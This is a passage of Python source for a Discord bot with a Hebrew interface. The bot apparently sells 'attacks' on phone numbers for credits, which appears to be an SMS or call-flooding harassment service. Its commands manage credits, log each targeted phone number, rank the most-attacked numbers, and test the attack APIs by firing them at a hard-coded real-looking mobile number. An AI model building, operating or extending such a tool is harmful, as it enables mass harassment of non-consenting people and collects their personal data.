async def give_all_slash(interaction: discord.Interaction, amount: int):
    if not is_admin_user(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    if amount <= 0:
        await interaction.followup.send("❌ חייב להיות חיובי.", ephemeral=True)
        return
    await users_db.update_many({}, {"$inc": {"credits": amount}})
    await interaction.followup.send(f"✅ נתת **{amount}** קרדיטים לכולם!", ephemeral=True)

@tree.command(name="checkcredit", description="[ADMIN] בדוק יתרה של משתמש ספציפי")
@app_commands.describe(member="משתמש לבדיקה")
async def admin_check_balance_slash(interaction: discord.Interaction, member: discord.Member):
    if not is_admin_user(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    balance_text = await display_balance(member.id)
    user_stats = await get_user_statistics(member.id)

    embed = discord.Embed(title="💳 מידע ארנק (תצוגת אדמין)", color=COLOR_BLACK)
    embed.add_field(name="משתמש:", value=member.mention, inline=True)
    embed.add_field(name="יתרה נוכחית:", value=f"**{balance_text}**", inline=True)
    if user_stats:
        embed.add_field(name="סך התקפות", value=str(user_stats.get("total_attacks", 0)), inline=True)
        embed.add_field(name="סך הצלחות", value=str(user_stats.get("total_success", 0)), inline=True)
        embed.add_field(name="סך כשלונות", value=str(user_stats.get("total_failed", 0)), inline=True)

    embed.set_footer(text=f"נבדק על ידי {interaction.user.name}")
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="transfercredit", description="העבר קרדיטים למשתמש אחר (מינימום 20)")
@app_commands.describe(member="מקבל", amount="כמות להעברה (מינימום 20)")
async def transfer_credit_slash(interaction: discord.Interaction, member: discord.Member, amount: int):
    await interaction.response.defer(ephemeral=True)
    if amount < 20:
        await interaction.followup.send("❌ מינימום העברה הוא **20** קרדיטים.", ephemeral=True)
        return
    if interaction.user.id == member.id:
        await interaction.followup.send("❌ אי אפשר להעביר לעצמך.", ephemeral=True)
        return

    sender_id = interaction.user.id
    if await has_lifetime_access(sender_id):
        await interaction.followup.send("❌ משתמשים ללא הגבלה לא יכולים להעביר קרדיטים.", ephemeral=True)
        return

    sender_balance = await get_user_credits(sender_id)
    if sender_balance < amount:
        await interaction.followup.send(f"❌ אין מספיק קרדיטים. יש לך **{sender_balance}**.", ephemeral=True)
        return

    await remove_credits_from_user(sender_id, amount)
    await add_credits_to_user(member.id, amount)

    embed = discord.Embed(title="💸 העברה הושלמה", color=0x000000)
    embed.add_field(name="מאת", value=interaction.user.mention, inline=True)
    embed.add_field(name="אל", value=member.mention, inline=True)
    embed.add_field(name="כמות", value=f"**{amount}** קרדיטים", inline=True)
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="restart", description="[ADMIN] הפעל מחדש את הבוט")
async def restart_bot_slash(interaction: discord.Interaction):
    if not is_admin_user(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return
    await interaction.response.send_message("🔄 מפעיל מחדש...", ephemeral=True)
    await bot.close()
    os.execv(sys.executable, [sys.executable] + sys.argv)

@tree.command(name="checkstatus", description="[ADMIN] בדוק כמה APIs עובדים")
async def check_api_status_slash(interaction: discord.Interaction):
    if not is_admin_user(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    test_number = "0506500708"
    success_count, failed_list = await execute_all_attacks(test_number)
    total_tested = success_count + len(failed_list)

    embed = discord.Embed(title="📊 בדיקת סטטוס API", color=COLOR_RED)
    embed.add_field(name="✅ עובדים", value=str(success_count), inline=True)
    embed.add_field(name="❌ נכשלו", value=str(len(failed_list)), inline=True)
    embed.add_field(name="🔢 סה\"כ נבדקו", value=str(total_tested), inline=True)

    if failed_list:
        failed_text = ", ".join(failed_list)
        if len(failed_text) > 1024:
            failed_text = failed_text[:1020] + "..."
        embed.add_field(name="API שנכשלו:", value=failed_text, inline=False)

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="attacklogs", description="[ADMIN] הצג לוגי התקפות אחרונים")
@app_commands.describe(limit="כמות לוגים להצגה (1-50)")
async def show_attack_logs_slash(interaction: discord.Interaction, limit: int = 10):
    if not is_admin_user(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    logs = await get_all_attack_history(min(limit, 50))

    if not logs:
        await interaction.followup.send("📭 אין לוגים עדיין.", ephemeral=True)
        return

    embed = discord.Embed(title="📋 לוגי התקפות אחרונים", color=COLOR_RED)
    for log in logs[:10]:
        embed.add_field(
            name=f"{log['user_name']} | {log['date']} {log['time']}",
            value=f"📱 {log['phone']}\n✅ {log['success_count']} | ❌ {log['failed_count']} | 💎 {log['credits_used']}",
            inline=False
        )

    if len(logs) > 10:
        embed.set_footer(text=f"+ {len(logs) - 10} לוגים נוספים")

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="topnumbers", description="[ADMIN] המספרים שהותקפו הכי הרבה")
async def top_target_numbers_slash(interaction: discord.Interaction):
    if not is_admin_user(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    top_targets = await get_most_attacked_numbers(10)

    if not top_targets:
        await interaction.followup.send("📭 אין נתונים עדיין.", ephemeral=True)
        return

    embed = discord.Embed(title="🎯 המספרים שהותקפו הכי הרבה", color=COLOR_RED)
    for idx, target in enumerate(top_targets, 1):
        embed.add_field(
            name=f"{idx}. {target['_id']}",
            value=f"התקפות: {target['count']} | הצלחות: {target['success_total']}",
            inline=False
        )

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="globalstats", description="[ADMIN] סטטיסטיקות גלובליות")
async def global_statistics_slash(interaction: discord.Interaction):
    if not is_admin_user(interaction):
        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    stats = await get_global_statistics()

    if not stats:
        await interaction.followup.send("📭 אין נתונים עדיין.", ephemeral=True)
        return

    embed = discord.Embed(title="📊 סטטיסטיקות גלובליות", color=COLOR_RED)
    embed.add_field(name="🎯 סך התקפות", value=str(stats.get("total_attacks", 0)), inline=True)
    embed.add_field(name="👥 משתמשים ייחודיים", value=str(stats.get("unique_users", 0)), inline=True)
    embed.add_field(name="💎 קרדיטים ששימשו", value=str(stats.get("total_credits", 0)), inline=True)
    embed.add_field(name="✅ סך הצלחות", value=str(stats.get("total_success", 0)), inline=True)
    embed.add_field(name="❌ סך כשלונות", value=str(stats.get("total_failed", 0)), inline=True)
    embed.add_field(name="📨 סך בקשות", value=str(stats.get("total_requests", 0)), inline=True)

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="mylogs", description="הצג את לוגי ההתקפות שלך")
async def my_attack_logs_slash(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    logs = await get_user_attack_history(interaction.user.id, 10)

    if not logs:
        await interaction.followup.send("📭 אין לך התקפות עדיין.", ephemeral=True)
        return

    embed = discord.Embed(title="📋 לוגי ההתקפות שלך", color=COLOR_RED)
    for log in logs:
        embed.add_field(
            name=f"{log['date']} {log['time']}",
            value=f"📱 {log['phone']}\n✅ {log['success_count']} | ❌ {log['failed_count']} | 💎 {log['credits_used']}",
            inline=False
        )

    await interaction.followup.send(embed=embed, ephemeral=True)

if __name__ == "__main__":
    bot.run(TOKEN)
